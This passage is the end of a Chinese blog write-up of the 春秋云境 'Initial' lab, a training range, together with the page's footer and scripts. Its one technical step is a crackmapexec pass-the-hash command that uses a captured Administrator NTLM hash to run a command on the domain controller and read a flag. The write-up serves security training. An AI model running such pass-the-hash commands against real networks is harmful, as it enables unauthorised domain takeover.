+<p>这里我们抓到了Administrator的hash，所以可以直接用crackmapexec打hash传递了，Administrator是域控的机器账户，就相当于域用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>打pth</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741237136731-4cbdf52c-963f-43c8-8ebf-8b8e5cab06ab.png"></p>
+<p>参考<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/">https://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tp%E6%BC%8F%E6%B4%9Erce"><span class="toc-number">1.</span> <span class="toc-text">tp漏洞rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">2.</span> <span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-number">3.</span> <span class="toc-text">DCSync</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&text=春秋云境-Initial"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&is_video=false&description=春秋云境-Initial"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Initial&body=Check out this article: https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&title=春秋云境-Initial"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&name=春秋云境-Initial&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/&t=春秋云境-Initial"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
